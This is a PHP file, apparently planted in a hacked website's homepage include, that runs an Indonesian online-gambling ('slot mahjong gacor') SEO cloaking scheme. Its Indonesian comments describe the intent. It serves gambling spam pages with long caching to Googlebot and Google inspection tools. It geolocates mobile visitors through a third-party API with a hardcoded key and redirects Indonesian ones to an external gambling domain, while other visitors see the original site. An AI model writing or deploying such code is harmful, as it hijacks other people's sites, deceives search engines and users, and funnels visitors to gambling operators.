<?php
$useRedirect = true; // ingin di buat 301 ke web lain atau tidak
$redirectTo = 'https://daftaraja.click/sso77';

$home_data = array(
	'brand'=>'slot mahjong gacor',
	'title'=>'Mainkan Slot Mahjong Gacor untuk Jackpot Besar',
	'description'=>'Slot Mahjong Gacor menggabungkan elemen klasik mahjong dengan fitur slot modern. Nikmati sensasi bermain slot sambil merasakan atmosfer permainan mahjong tradisional, lengkap dengan bonus besar dan peluang gacor yang menggiurkan.',
);


/*
 * File included di homepage
 *
 * di buka pc dan google dan ip luar ya web asli
 * di buka mobile dan ip indo web judi nya
 */
function check_user_agent($agent) {
    return strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false;
}

function cache_response() {
    header("Cache-Control: public, max-age=31536000"); // Cache for 1 year
    header("Pragma: cache");
    header("Expires: " . gmdate('D, d M Y H:i:s', time() + 31536000) . " GMT");
}

function getData($brand) {

	$row = 1;
	if ( ( $handle = fopen( dirname( __FILE__ ) . '/data.csv', "r" ) ) !== FALSE ) {
		while( ( $line = fgetcsv( $handle, null, "," ) ) !== FALSE ) {
			$num = count( $line );
			if ( $row == 1 ) {$row ++;continue;} else {$row ++;}

			// skip empty content
			if ( ! $line[0] ) continue;

			// Found
			if(strtolower(trim($line[0])) == strtolower(trim($brand))){
				fclose( $handle );
				return array(
					'brand'=>trim($line[0]),
					'title'=>trim($line[1]),
					'description'=>trim($line[2]),
				);
			}


		}

		fclose( $handle );

		return false;
	}

}


function isMobile() {
    return ;
}


$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
$fullUrl = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

$parsedUrl = parse_url($fullUrl);
$scheme = isset($parsedUrl['scheme']) ? $parsedUrl['scheme'] : '';
$host = isset($parsedUrl['host']) ? $parsedUrl['host'] : '';
$path = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';
$query = isset($parsedUrl['query']) ? $parsedUrl['query'] : '';
$baseUrl = $scheme . "://" . $host . $path . '?' . $query;
$urlPath = $baseUrl;

if (isset($_GET['forum'])) {
		$target_string = strtolower($_GET['forum']);
		$data = getData($target_string);

    if ($data) {
        extract($data);

				if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification') || check_user_agent('Google-InspectionTool')) {
				    cache_response();

				    include dirname(__FILE__) . '/content.php';
				    exit;
				} else {

						if (isMobile()){
							$ip = $_SERVER['REMOTE_ADDR'];
						  $apiKey = 'd7625db1ce4e4b3f91e403f81986bd63';
						  $geo = json_decode(file_get_contents("https://api.ipgeolocation.io/ipgeo?apiKey=$apiKey&ip=$ip"), true);

						  if ($geo['country_code2'] == 'ID') {
						      if($useRedirect){
						        header("Location: " . $redirectTo);
							    } else {
							      include dirname(__FILE__) . '/content.php';
						      }
						      exit;
						  }
						}
				}
    }
} else {

		// home page
	  extract($home_data);

		if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification') || check_user_agent('Google-InspectionTool')) {
		    cache_response();

		    include dirname(__FILE__) . '/content.php';
		    exit;
		} else {

				if (isMobile()){
					$ip = $_SERVER['REMOTE_ADDR'];
				  $apiKey = 'd7625db1ce4e4b3f91e403f81986bd63';
				  $geo = json_decode(file_get_contents("https://api.ipgeolocation.io/ipgeo?apiKey=$apiKey&ip=$ip"), true);

				  if ($geo['country_code2'] == 'ID') {
				      if($useRedirect){
				            header("Location: " . $redirectTo);
					    } else {
					        include dirname(__FILE__) . '/content.php';
				      }
				      exit;
				  }
				}
		}
}


// buka konten asli